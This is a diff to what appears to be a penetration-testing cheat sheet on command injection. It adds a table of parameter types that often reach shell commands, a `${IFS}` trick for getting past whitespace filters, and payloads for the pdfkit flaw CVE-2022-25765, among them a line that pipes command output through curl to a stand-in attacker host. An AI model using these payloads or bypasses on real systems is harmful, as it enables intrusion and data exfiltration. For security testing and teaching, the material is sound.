@@ -305,7 +305,47 @@ ps aux              # Running processes (1 min)
 
 ---
 
-## 💡 Pro Tips
+## Injection Indicator Recognition
+
+Parameters likely passed to shell commands (prioritize testing these):
+
+| Indicator | Example | Shell Command Likely |
+|-----------|---------|---------------------|
+| Date/time format specifiers | `?format=%H:%M:%S`, `?fmt=%Y-%m-%d` | `date +FORMAT` |
+| Filename/path parameters | `?file=report.pdf`, `?path=/tmp/out` | `cat`, `ls`, `find` |
+| IP/hostname inputs | `?host=192.168.1.1`, `?target=example.com` | `ping`, `nslookup`, `dig` |
+| Conversion/encoding params | `?convert=pdf`, `?encode=base64` | `convert`, `base64` |
+| Search/grep-like features | `?pattern=error`, `?search=keyword` | `grep`, `find` |
+| Config validation fields | `?sendMailPath=`, `?binaryPath=`, `?compiler=` | `which`, `test -f`, `file` |
+
+When you see format specifiers matching shell tool syntax (e.g., `%H`, `%M`, `%S` for `date`; `%s`, `%d` for `printf`), the backend likely invokes that tool directly rather than using a language-native function.
+
+**\s regex trap**: If the app uses `\s` regex for space filtering (common in PHP `preg_match('/\s/', ...)`), note that `\s` matches ALL whitespace including `\n`, `\r`, `\t`. Newline injection (`%0a`) will NOT bypass it. Use `${IFS}` or `$IFS$9` instead — these are variable expansions, not whitespace characters.
+
+---
+
+## Library-Specific Command Injection
+
+### URL-to-PDF Converters (pdfkit, wkhtmltopdf wrappers)
+When a web app converts URLs to PDFs, the URL parameter itself may be passed unsanitized to a library that shells out. Common in Ruby (pdfkit gem — CVE-2022-25765), Python (pdfkit), Node.js (html-pdf).
+
+**Payload format** (inject in the URL parameter value):
+```
+http://attacker/?name=%20`COMMAND`
+```
+The `%20` (URL-encoded space) before backticks is critical — it terminates the URL argument and starts shell interpretation.
+
+**Exfiltration via HTTP callback** (when no direct output):
+```
+http://attacker:9001/?name=%20`id | curl http://attacker:9001/ -d @-`
+```
+Start an HTTP listener, inject command piped to `curl POST`, read output from the POST body.
+
+**Detection**: Look for PDF generation features, "convert URL to PDF" functionality, Ruby/Sinatra/Puma tech stacks. Check PDF metadata (`exiftool output.pdf`) for generator strings like "pdfkit", "wkhtmltopdf".
+
+---
+
+## Pro Tips
 
 1. **Always test time-based first** - It works even with strict filtering
 2. **Use Burp Repeater** - Faster than re-submitting forms
